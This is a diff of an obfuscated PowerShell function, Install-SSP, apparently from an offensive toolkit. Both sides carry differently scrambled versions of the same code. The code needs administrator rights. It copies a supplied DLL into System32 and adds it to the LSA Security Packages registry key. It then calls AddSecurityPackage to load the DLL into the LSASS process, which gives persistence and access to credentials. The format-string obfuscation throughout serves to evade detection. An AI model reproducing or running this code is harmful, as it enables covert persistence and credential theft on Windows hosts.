@@ -1,171 +1,171 @@
-$y9m  =  [type]("{8}{1}{6}{5}{4}{0}{3}{7}{2}"-f'wSIdE','RiTY.','ITY','N','O','PAl.wInD','PRiNCI','t','SEcU') ;   $UCqP =  [TYPE]("{2}{5}{1}{6}{3}{7}{4}{0}" -f'InROLe','UR','S','.PRInCipaL.wiNDOw','t','ec','ITY','sbuil') ;  SV  vdEG5W  ( [tYPE]("{3}{2}{1}{4}{0}{5}" -F 'FILEm','TeM.i','ys','s','o.','oDE') ) ;  $1OKHFz =[tYpE]("{3}{0}{2}{1}" -F 't','.FILeACCEss','Em.iO','SYs')  ;$9j3=  [tyPE]("{2}{1}{0}{4}{3}"-F 'SCi','T.A','sYSTEM.tEX','ENcOdInG','I')  ;$plZTk4 =  [type]("{2}{5}{0}{4}{3}{1}"-F'.SeEkoRI','N','Sy','i','g','StEm.IO') ;  sEt-ItEm VarIABle:UHmc0o  (  [tYpE]("{2}{3}{0}{1}"-f 'omA','In','aP','pD') )  ; set ("D"+"5F")  ( [TYpE]("{8}{0}{7}{9}{3}{2}{6}{5}{1}{4}" -F'n.','c','U','Lyb','ess','DERAC','iL','eMIt.AsSE','rEflecTIO','mB') )  ;  Set-ITeM vAriABLe:Ku87  ( [tyPe]("{2}{5}{4}{0}{1}{6}{3}"-f'Lli','Ng','REfle','NTioNs','N.CA','CTio','coNVE')  ) ;   sEt-itEm  vaRIaBLe:KvYz ([type]("{7}{6}{12}{0}{4}{1}{5}{10}{2}{8}{9}{3}{11}" -f 'T','RoPS','ces.','Io','E','ERV','T','run','CALLiNGCO','nVeNt','i','n','IME.In')  )  ;   sEt-VaRiabLe ('2'+'43') ([tYpE]("{5}{3}{7}{0}{2}{4}{8}{1}{6}"-F'.INT','es.ChaRSE','erO','unt','PServI','R','t','Ime','C') )  ;  set-variablE  ('pDZ'+'83') ([tyPE]("{0}{1}"-F 'iN','TPtr')  )  ;  $819 =[TYPe]("{0}{5}{1}{7}{4}{3}{6}{2}"-F 'run','Me','L','rOPsERV','e','TI','IceS.mArSHa','.int') ;function in`stalL-`sSP
+  ${Y`cDt}  = [tYpe]("{4}{3}{6}{7}{5}{1}{0}{2}" -f'en','pal.windowSId','Tity','ecuR','S','CI','I','TY.pRin') ; Set-vaRIAbLE ("{1}{0}" -f'rj','f')  ( [tYpe]("{0}{2}{6}{1}{7}{4}{3}{8}{5}"-f 'S','Y.PrInCI','eCuRi','bUIL','Ows','LE','T','pal.WINd','tINro') ) ;   ${X`kW}  = [tYPe]("{2}{1}{3}{0}" -F'IlemOdE','StEM','Sy','.io.f')  ;  sV  ('x1'+'uO') ( [TYPE]("{0}{4}{2}{6}{1}{3}{5}" -F'SyStEM','c','.fiLe','C','.iO','Ess','A'))  ;    Set-IteM  ("varIaBLe:u"+"W"+"b") (  [TYpe]("{1}{0}{4}{3}{2}"-f'.','sySTEm','Ng','OdI','TeXt.asCiienc') ) ;${60Oc}  = [TYpE]("{6}{2}{1}{3}{4}{0}{5}"-f'koRig','M.io.S','te','e','E','iN','SYs');  sV  ('yAp'+'vd')  (  [TyPE]("{2}{1}{0}"-F'MaIN','dO','App') ) ;  ${8d`B6O5}=[TYpE]("{1}{3}{6}{2}{0}{4}{5}" -f 'emBlybu','Ref','.ASS','LE','IlD','ERACCESS','CTIon.emit');    Set-ITEm ("vAr"+"Iable:"+"T"+"8Cg")  ([TyPe]("{3}{5}{7}{0}{6}{4}{8}{2}{1}"-f 'o','onS','TI','Ref','al','lECT','n.c','I','lINgcoNVEn') )  ;  SET-vAriAbLe  ("{0}{1}" -f '0','zs')  ( [type]("{2}{7}{0}{6}{5}{1}{3}{4}"-f'Me.','eRvIce','rUn','S.CaLlI','NgcONVEnTIoN','Terops','IN','TI')  ); SEt ("{0}{1}" -f 'N','5m') ( [tYPE]("{0}{5}{4}{6}{8}{2}{7}{3}{1}"-F'ru','harSEt','PserV','.C','tIM','N','E.','IcES','iNTERo')  ) ;${c`7fb`dZ}  =  [TyPE]("{0}{2}{1}"-F 'I','TPtr','n');${6`O0hvP}= [TYPE]("{3}{0}{2}{5}{1}{7}{4}{6}" -f'u','in','NtIme','R','icES.MaRshA','.','l','teropSerV') ;function INStAl`l-`S`sP
 {
 
 
     [CmdletBinding()] Param (
-        [ValidateScript({.("{2}{1}{0}" -f '-Path','st','Te') (&("{1}{2}{0}" -f'th','Res','olve-Pa') ${_})})]
+        [ValidateScript({Test-Path (Resolve-Path ${_})})]
         [String]
-        ${PA`TH}
+        ${p`Ath}
     )
 
-    ${pri`N`cIpAL} = [Security.Principal.WindowsPrincipal] $Y9m::("{2}{1}{0}"-f 'nt','re','GetCur').Invoke()
+    ${PrI`N`ciPaL} = [Security.Principal.WindowsPrincipal] ${yc`dt}::"G`EtCuRRe`Nt"()
 
-    if(-not ${PRiN`Ci`PaL}."IsINr`o`le"( $ucqp::"Ad`min`i`stRAtOr"))
+    if(-not ${P`RI`NC`IPal}."I`SinRolE"(  (GI  ("{3}{0}{2}{1}" -f 'ARi','Le:frj','ab','V')).VAlUe::"Adm`I`NisTR`At`OR"))
     {
-        throw ("{9}{17}{14}{1}{20}{5}{8}{4}{22}{11}{3}{18}{15}{13}{21}{10}{6}{7}{19}{16}{0}{2}{12}"-f 'promp','SSP dl','t','ve rights. E',' a','re','va','ted Power','s','I','e','rati','.',' script from','ling an ','this','hell ','nstal','xecute ','S','l requi',' an el','dminist')
+        throw 'Installing an SSP dll requires administrative rights. Execute this script from an elevated PowerShell prompt.'
     }
 
     
-    ${f`uLlDL`LpAth} = .("{2}{1}{3}{0}" -f 'th','solve','Re','-Pa') ${Pa`Th}
+    ${FUlLDLl`p`A`Th} = Resolve-Path ${Pa`TH}
 
     
-    function LoC`AL:`g`E`T-peArc`hiTeC`TU`Re
+    function LOCAl:g`Et-peaRcHItE`C`TU`Re
     {
         Param
         (
-            [Parameter( poSiTION = 0,
-                        manDATOry = ${tr`UE} )]
+            [Parameter( pOsITion = 0,
+                        MandATory = ${TR`Ue} )]
             [String]
-            ${P`ATh}
+            ${pA`Th}
         )
     
         
-        ${f`IL`ESTr`eAm} = .("{0}{2}{1}{3}" -f 'N','-Ob','ew','ject') ("{3}{0}{1}{2}{4}" -f 'e','m.IO.File','St','Syst','ream')(${p`ATh},  ( Ls VaRIAble:vDEg5w).VaLUe::"op`EN",   (  vArIaBLE ("1ok"+"h"+"fZ")  ).vALuE::"r`eAd")
+        ${Fil`e`S`TreaM} = New-Object ("{3}{0}{1}{2}{4}" -f 's','tem.I','O.FileS','Sy','tream')(${Pa`Th},   ${X`KW}::"Op`eN",  (gi  ('Va'+'r'+'iaB'+'lE'+':x1uO')).vALUe::"rE`Ad")
     
-        [Byte[]] ${mz`hE`ADeR} = &("{1}{0}{2}" -f 'w-O','Ne','bject') ("{0}{1}" -f 'Byte','[]')(2)
-        ${f`i`Les`TREAm}.("{0}{1}"-f'R','ead').Invoke(${MzheA`d`ER},0,2) | .("{0}{2}{1}" -f 'Out','Null','-')
+        [Byte[]] ${m`zHe`A`der} = New-Object ("{0}{1}" -f 'Byte','[]')(2)
+        ${F`IL`eS`TrEAM}."RE`AD"(${m`Zhe`ADER},0,2) | Out-Null
     
-        ${Hea`DEr} =   (gET-chiLDiTEm ("VaRi"+"abLe:9J"+"3") ).vAlUE::"AsC`ii".("{0}{1}" -f'Ge','tString').Invoke(${Mz`h`eADEr})
-        if (${h`eA`der} -ne 'MZ')
+        ${h`EA`dER} =  ( childITEM ("VarIabLE:u"+"w"+"B") ).VaLue::"aS`CII"."gEt`StRi`Ng"(${M`ZHEad`ER})
+        if (${hE`AdEr} -ne 'MZ')
         {
-            ${Filest`R`e`Am}.("{0}{1}" -f'Cl','ose').Invoke()
-            Throw ("{0}{3}{5}{4}{1}{2}"-f 'I',' hea','der.','nv',' PE','alid')
+            ${F`IlE`sTRe`AM}."cLo`se"()
+            Throw 'Invalid PE header.'
         }
     
         
-        ${fIL`EStrE`Am}."SE`EK"(0x3c,   (gI  variabLe:PLZTK4).vaLUe::"b`eGin") | .("{0}{2}{1}"-f'Ou','Null','t-')
+        ${Fi`lEST`REAM}."S`eeK"(0x3c,   ( geT-ChilDItem ("{1}{0}{3}{4}{2}" -f 'Le','VARIAB','C',':','60O')).Value::"BE`GIn") | Out-Null
     
-        [Byte[]] ${l`Fan`Ew} = &("{2}{3}{1}{0}"-f'bject','-O','Ne','w') ("{0}{1}"-f'B','yte[]')(4)
-    
-        
-        ${F`IlES`TrEAM}.("{1}{0}" -f'ead','R').Invoke(${L`Fa`NEw},0,4) | &("{0}{1}"-f'Out-Nul','l')
-        ${PEoF`FsEt} = [Int] ('0x{0}' -f (( ${L`F`ANEw}[-1..-4] | .('%') { ${_}.("{0}{1}" -f'To','String').Invoke('X2') } ) -join ''))
+        [Byte[]] ${L`FaN`EW} = New-Object ("{1}{0}"-f ']','Byte[')(4)
     
         
-        ${FILES`T`RE`Am}."sE`eK"(${pE`of`FseT} + 4,  (  get-vARiaBLE  ("Plz"+"tk4")).vaLue::"Beg`iN") | &("{0}{2}{1}" -f 'O','l','ut-Nul')
-        [Byte[]] ${IM`AGE`_Fi`Le`_mAchiNe} = &("{1}{2}{0}" -f't','New-O','bjec') ("{1}{0}"-f'[]','Byte')(2)
+        ${F`IlEs`TreAm}."RE`AD"(${Lf`AnEw},0,4) | Out-Null
+        ${PEoF`FS`et} = [Int] ('0x{0}' -f (( ${l`F`AnEW}[-1..-4] | % { ${_}."tOst`R`ING"('X2') } ) -join ''))
     
         
-        ${Fi`LesTR`e`AM}.("{1}{0}"-f 'ead','R').Invoke(${Im`A`ge_F`iLE_Mac`hine},0,2) | .("{1}{2}{0}" -f'-Null','O','ut')
-        ${arcHITe`c`T`uRe} = '{0}' -f (( ${IMA`GE_fiLe_`m`AchinE}[-1..-2] | &('%') { ${_}.("{2}{0}{1}" -f'o','String','T').Invoke('X2') } ) -join '')
-        ${filEsTr`E`Am}.("{0}{1}"-f 'Cl','ose').Invoke()
+        ${FIl`eStrE`AM}."se`ek"(${pE`o`FFSEt} + 4,  ( Ls  ("v"+"aRIAb"+"L"+"e:60OC")  ).ValUe::"b`eGin") | Out-Null
+        [Byte[]] ${i`mAGE_`File_`m`ACh`iNe} = New-Object ("{2}{0}{1}" -f'e[',']','Byt')(2)
     
-        if ((${arc`hiTECt`URE} -ne ("{1}{0}" -f '4C','01')) -and (${ArC`hIT`eCt`UrE} -ne ("{1}{0}" -f '4','866')))
+        
+        ${FI`Les`TRE`Am}."rE`AD"(${ImAGe_`File`_`M`Ach`Ine},0,2) | Out-Null
+        ${aRch`ITeC`T`URE} = '{0}' -f (( ${ImaGe_`FiL`E`_mACHiNe}[-1..-2] | % { ${_}."Tost`RInG"('X2') } ) -join '')
+        ${FI`LESt`Ream}."Cl`ose"()
+    
+        if ((${A`RcHi`TeCtu`RE} -ne '014C') -and (${aRC`hiteCT`uRe} -ne '8664'))
         {
-            Throw ("{1}{9}{5}{3}{6}{0}{11}{7}{4}{10}{8}{2}" -f 'upporte','Invalid PE','.',' un','tu','or','s',' architec','e',' header ','r','d')
+            Throw 'Invalid PE header or unsupported architecture.'
         }
     
-        if (${A`Rc`hiTe`C`TURE} -eq ("{1}{0}" -f'14C','0'))
+        if (${ARcHi`TECTu`Re} -eq '014C')
         {
-            &("{1}{2}{3}{0}"-f'put','Writ','e','-Out') ("{2}{1}{0}" -f 't','2-bi','3')
+            Write-Output '32-bit'
         }
-        elseif (${aRcHI`TEc`Ture} -eq ("{0}{1}" -f'866','4'))
+        elseif (${archIT`ec`TUre} -eq '8664')
         {
-            .("{0}{1}{2}" -f 'Wr','ite-Out','put') ("{1}{0}"-f '4-bit','6')
+            Write-Output '64-bit'
         }
         else
         {
-            &("{2}{1}{0}" -f 't','Outpu','Write-') ("{1}{0}" -f 'r','Othe')
+            Write-Output 'Other'
         }
     }
 
-    ${dLl`ArchiTe`C`TuRE} = &("{1}{0}{3}{2}"-f't-P','Ge','hitecture','EArc') ${F`u`l`ldLLpATH}
+    ${DL`larchiT`Ec`TUre} = Get-PEArchitecture ${fu`L`ld`LlPath}
 
-    ${o`sar`ch} = &("{1}{0}{2}{3}"-f 'et-W','G','miObj','ect') ("{0}{2}{1}{3}{5}{4}" -f 'Wi','p','n32_O','erati','m','ngSyste') | .("{0}{2}{1}" -f 'Select','t','-Objec') -ExpandProperty ("{0}{1}{2}{4}{3}" -f'O','S','Arc','cture','hite')
+    ${OS`ARcH} = Get-WmiObject ("{1}{6}{3}{2}{0}{5}{4}" -f 'erating','Wi','Op','2_','tem','Sys','n3') | Select-Object -ExpandProperty ("{0}{2}{1}"-f'O','ture','SArchitec')
 
-    if (${DLl`ARC`hI`TECTUre} -ne ${Os`AR`cH})
+    if (${d`ll`ArcH`itE`CTURE} -ne ${O`SArcH})
     {
-        throw ("{18}{14}{6}{20}{12}{1}{15}{21}{10}{13}{4}{8}{9}{5}{2}{17}{3}{11}{7}{16}{22}{0}{19}"-f'dl','era','m',' ','i','e must ',' ','tecture of','tect','ur','rc','archi','p','h','he','ting system ',' the S','atch the','T','l.','o','a','SP ')
+        throw 'The operating system architecture must match the architecture of the SSP dll.'
     }
 
-    ${d`Ll} = &("{0}{2}{1}" -f'Get-I','em','t') ${fUlld`ll`P`ATH} | .("{0}{2}{1}{3}"-f 'S','t-Objec','elec','t') -ExpandProperty ("{0}{1}"-f 'Na','me')
+    ${D`Ll} = Get-Item ${FULl`D`LlP`ATH} | Select-Object -ExpandProperty ("{1}{0}" -f 'e','Nam')
 
     
     
-    ${D`Ll`NamE} = ${d`ll} | &('%') { &('%') {(${_} -split '\.')[0]} }
+    ${dLl`N`Ame} = ${D`ll} | % { % {(${_} -split '\.')[0]} }
 
     
-    ${S`e`cURityP`Ac`K`AgeS} = .("{2}{1}{3}{0}"-f'y','Item','Get-','Propert') (("{2}{8}{4}{13}{3}{9}{11}{14}{12}{10}{7}{0}{6}{1}{5}" -f'HCo','8HLs','HKL','STEM','38H','a','ntrol3','38','M:','38HCur','et','rentC','ntrolS','SY','o'))."REPL`ACe"(([chaR]51+[chaR]56+[chaR]72),'\') -Name ("{0}{2}{3}{1}"-f 'Secu','s','rity ','Package') |
-        &("{2}{1}{3}{0}"-f't','t','Selec','-Objec') -ExpandProperty ("{2}{0}{1}{3}" -f 'rity',' Package','Secu','s')
+    ${sec`urI`Typa`ck`AgES} = Get-ItemProperty (("{8}{2}{10}{6}{5}{4}{12}{11}{1}{7}{0}{3}{9}" -f 'olSet','n','M:rAUSYST','rAUCon','r','UCu','MrA','tr','HKL','trolrAULsa','E','ntCo','re')).REPLacE('rAU','\') -Name 'Security Packages' |
+        Select-Object -ExpandProperty 'Security Packages'
 
-    if (${S`e`CuRi`TYpackAgES} -contains ${DL`Ln`AmE})
+    if (${SeCUR`ITy`p`AcK`A`gEs} -contains ${dLlN`A`me})
     {
-        throw ("'$DllName' "+'i'+'s '+'al'+'r'+'eady '+'present'+' '+'in'+' '+('HKLM:{0}SYS'+'TEM{0'+'}Cu'+'rrentCon'+'tr'+'olS'+'e'+'t{0'+'}Contro'+'l{'+'0'+'}'+'Lsa{0}'+'Secu'+'rity ')-f [char]92+'Pack'+'ag'+'es.')
+        throw "'$DllName' is already present in HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages."
     }
 
     
-    ${NAT`IV`e`iNsTAlLdIR} = "$($Env:windir)\Sysnative"
+    ${N`ATive`I`NStA`L`lDir} = "$($Env:windir)\Sysnative"
 
-    if (.("{0}{2}{1}" -f'Test-','ath','P') ${NAtIV`EIN`s`TalLd`IR})
+    if (Test-Path ${NatIVe`iNsta`l`LdIR})
     {
-        ${I`NSTALl`dIR} = ${n`A`Ti`V`EIn`STALLdIr}
+        ${iNst`AL`lD`Ir} = ${nativ`eI`Ns`TalLDIR}
     }
     else
     {
-        ${i`N`StALl`diR} = "$($Env:windir)\System32"
+        ${iNSta`l`l`dIR} = "$($Env:windir)\System32"
     }
 
-    if (&("{0}{1}{2}" -f 'Tes','t-','Path') (&("{2}{1}{3}{0}" -f'h','in-','Jo','Pat') ${In`stalL`DIR} ${d`LL}))
+    if (Test-Path (Join-Path ${iNstA`L`LD`IR} ${d`ll}))
     {
-        throw ("$Dll "+'is'+' '+'alre'+'ady'+' '+'in'+'s'+'t'+'alled '+'in'+' '+"$InstallDir.")
+        throw "$Dll is already installed in $InstallDir."
     }
 
     
-    .("{0}{2}{1}"-f 'Copy-','tem','I') ${F`UL`LdllpA`TH} ${i`Nsta`LLdIr}
+    Copy-Item ${ful`L`dlLp`AtH} ${INStAll`D`Ir}
 
-    ${s`eCUrI`T`yPaCK`A`gEs} += ${DLL`Na`me}
+    ${S`ecuRit`ypAcKA`gES} += ${dl`L`Name}
 
-    .("{0}{2}{1}{3}"-f'Set-It','mPr','e','operty') ((("{15}{11}{3}{7}{8}{10}{13}{4}{0}{5}{6}{12}{2}{1}{9}{14}"-f 'Con','rol','t','{','ent','t','rolSet{0}','0','}S','{0}L','YSTEM{0}C','LM:','Con','urr','sa','HK'))  -F  [ChAr]92) -Name ("{3}{0}{2}{1}{4}" -f 'cu','ty Package','ri','Se','s') -Value ${SEcURI`TY`P`Ackag`eS}
+    Set-ItemProperty ((("{1}{8}{0}{4}{2}{9}{5}{6}{7}{10}{3}" -f 'Y','HKLM:','QD1CurrentContro','1Lsa','STEM','etQ','D1Contro','lQ','QD1S','lS','D'))  -cRePLace 'QD1',[cHAR]92) -Name 'Security Packages' -Value ${SEC`U`RityP`ACkages}
 
-    ${D`YnasS`E`MbLY} = .("{2}{0}{1}{3}"-f'bj','e','New-O','ct') ("{2}{5}{1}{0}{4}{3}{7}{6}"-f 'n.Ass','o','Sys','blyN','em','tem.Reflecti','me','a')(("{1}{0}" -f 'PI2','SS'))
-    ${As`sE`MbLYB`UiLdeR} =  $UHMc0o::"CU`RReN`T`Do`main"."d`EfI`NEdYnamIca`s`sEMbly"(${dYN`A`sSeMbly},  $D5F::"r`un")
-    ${mo`Du`Le`Bu`ilDer} = ${asSe`MB`LYbu`iLD`ER}.("{2}{3}{0}{1}{4}" -f'M','odu','Defin','eDynamic','le').Invoke(("{0}{1}"-f'SS','PI2'), ${F`ALSe})
+    ${DYnaS`S`eMblY} = New-Object ("{0}{1}{7}{4}{2}{5}{6}{3}" -f 'S','yste','e','Name','R','flecti','on.Assembly','m.')('SSPI2')
+    ${assE`M`BLyBUil`Der} =   ${yAP`Vd}::"CU`Rre`NtDoma`IN"."de`FI`NED`y`NAmIcaS`semb`LY"(${dyna`S`Sem`BLY},   (  DiR ("{0}{1}{3}{2}{4}" -f'vaR','iAb','8d','le:','B6o5') ).vALUe::"r`uN")
+    ${M`odULebUi`lder} = ${Assem`B`LYbu`I`LDEr}."deF`inEDyna`mI`cmOD`u`LE"('SSPI2', ${faL`sE})
 
-    ${T`yPebUI`L`der} = ${mO`DUlebUiL`deR}.("{0}{2}{1}" -f'Def','pe','ineTy').Invoke(("{1}{0}{2}"-f 'PI2.Sec','SS','ur32'), ("{2}{0}{1}" -f'blic, ','Class','Pu'))
-    ${piN`VO`Kem`etHod} = ${TY`PEBuI`ldER}.("{2}{5}{4}{1}{3}{0}"-f'd','ok','Defin','eMetho','v','ePIn').Invoke(("{4}{2}{1}{3}{0}" -f 'age','ri','Secu','tyPack','Add'),
-        ("{1}{2}{0}" -f 'dll','sec','ur32.'),
-        ("{3}{1}{2}{0}" -f'c','Sta','ti','Public, '),
-          $KU87::"s`TanDa`RD",
+    ${Ty`PebuILD`er} = ${MODUL`eBU`Il`DER}."De`F`inE`TYpe"('SSPI2.Secur32', 'Public, Class')
+    ${PIn`V`OKE`m`eTHOD} = ${TY`pEbuiL`deR}."De`FinePINvo`kEm`E`THoD"('AddSecurityPackage',
+        'secur32.dll',
+        'Public, Static',
+          ${T8`Cg}::"stA`ND`ARD",
         [Int32],
         [Type[]] @([String], [IntPtr]),
-         $kVYz::"WinA`pI",
-          $243::"au`TO")
+         (  gET-VarIABle ("{1}{0}" -f 'ZS','0')  -ValUeonl )::"WInA`PI",
+          ${n`5M}::"AU`TO")
 
-    ${SE`CuR`32} = ${ty`pEBu`iLD`er}.("{2}{1}{0}" -f 'pe','ateTy','Cre').Invoke()
+    ${S`Ecu`R32} = ${TYp`e`BUI`lDEr}."C`REaTET`YpE"()
 
-    if (  (VaRiABle ('pDz'+'83')  ).vALue::"s`IzE" -eq 4) {
-        ${StRuc`T`SIzE} = 20
+    if ( ( vaRiAble ('c'+'7FbDZ') ).VAlUe::"S`Ize" -eq 4) {
+        ${S`Tructs`i`ZE} = 20
     } else {
-        ${s`TRu`cTSI`ZE} = 24
+        ${S`TrucTs`ize} = 24
     }
 
-    ${s`Tru`cTPTr} =   (Dir  ("V"+"a"+"RIAblE:81"+"9") ).vAlUE::("{1}{2}{0}" -f 'Global','A','llocH').Invoke(${sT`RuCt`Si`ZE})
-      (GI  vaRIAbLe:819  ).VaLUe::("{1}{2}{0}"-f 'nt32','Wri','teI').Invoke(${s`T`RUcTpTR}, ${STruct`S`Ize})
+    ${S`T`RUctpTr} =   ( gI  ("{1}{4}{3}{0}{2}"-f '0','v','hVp','BlE:6O','ARIa') ).VALUE::"AL`lo`cHgLObal"(${str`Uct`SIzE})
+     (  chILDITeM ("{2}{1}{0}{3}"-f'O0H','riaBLE:6','VA','VP')  ).Value::"wrIT`e`iNt32"(${st`R`u`CTptr}, ${sTru`C`TSI`Ze})
 
-    ${runTiME`Suc`CESS} = ${Tr`ue}
+    ${runTI`M`eSUC`Ce`SS} = ${t`Rue}
 
     try {
-        ${res`Ult} = ${Se`cuR`32}::("{0}{2}{1}{3}"-f 'AddS','rityPack','ecu','age').Invoke(${Dl`Ln`AmE}, ${st`RUct`PTR})
+        ${rE`SU`lt} = ${s`Ec`ur32}::"AddS`E`c`U`RitypAck`Age"(${dLl`N`AME}, ${STRuC`T`pTR})
     } catch {
-        ${hRE`S`uLT} = ${ER`ROr}[0]."exC`epT`iON"."iNNER`ExceP`Ti`On"."hREs`U`lT"
-        &("{2}{1}{0}{3}"-f'in','Warn','Write-','g') "Runtime loading of the SSP failed. (0x$($HResult.ToString('X8'))) "
-        .("{4}{1}{3}{0}{2}"-f 'rni','W','ng','a','Write-') "Reason: $(([ComponentModel.Win32Exception] $HResult).Message) "
-        ${ru`NTI`mesUccess} = ${f`AlsE}
+        ${hR`e`sult} = ${er`ROR}[0]."Excep`Ti`ON"."I`NnE`R`eXCePT`ioN"."HrESU`LT"
+        Write-Warning "Runtime loading of the SSP failed. (0x$($HResult.ToString('X8')))"
+        Write-Warning "Reason: $(([ComponentModel.Win32Exception] $HResult).Message)"
+        ${RUN`TiMES`Uc`cE`SS} = ${f`AlsE}
     }
 
-    if (${RuNtIMES`Ucc`ess}) {
-        .("{1}{0}{3}{2}" -f'r','W','e-Verbose','it') ("{2}{3}{0}{6}{8}{1}{7}{5}{4}" -f 'll','oa','In','sta','mplete!','co','ation an','ding ','d l')
+    if (${Ru`NT`iMESU`cCEsS}) {
+        Write-Verbose 'Installation and loading complete!'
     } else {
-        .("{1}{3}{0}{2}"-f 'e-Verbos','W','e','rit') ("{5}{1}{3}{9}{6}{7}{2}{0}{8}{4}"-f 'take eff','nstal','to ','l','.','I','n complete! Reboot for ','changes ','ect','atio')
+        Write-Verbose 'Installation complete! Reboot for changes to take effect.'
     }
 }
